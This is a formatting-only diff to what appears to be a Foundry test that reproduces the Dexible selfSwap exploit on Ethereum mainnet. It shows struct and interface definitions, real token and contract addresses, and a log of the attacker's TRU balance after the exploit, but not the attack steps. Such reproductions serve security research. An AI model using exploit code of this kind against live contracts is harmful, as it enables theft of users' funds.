@@ -11,13 +11,16 @@ import "./../interface.sol";
 // https://twitter.com/MevRefund/status/1626450002254958592
 
 library TokenTypes {
+
     struct TokenAmount {
         uint112 amount;
         address token;
     }
+
 }
 
 library SwapTypes {
+
     struct RouterRequest {
         address router;
         address spender;
@@ -31,13 +34,17 @@ library SwapTypes {
         TokenTypes.TokenAmount tokenOut;
         RouterRequest[] routes;
     }
+
 }
 
 interface IDexible {
+
     function selfSwap(SwapTypes.SelfSwap calldata request) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 TRU = IERC20(0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784);
     IDexible Dexible = IDexible(0xDE62E1b0edAa55aAc5ffBE21984D321706418024);
@@ -77,4 +84,5 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint("Attacker TRU balance after exploit", TRU.balanceOf(address(this)), TRU.decimals());
     }
+
 }
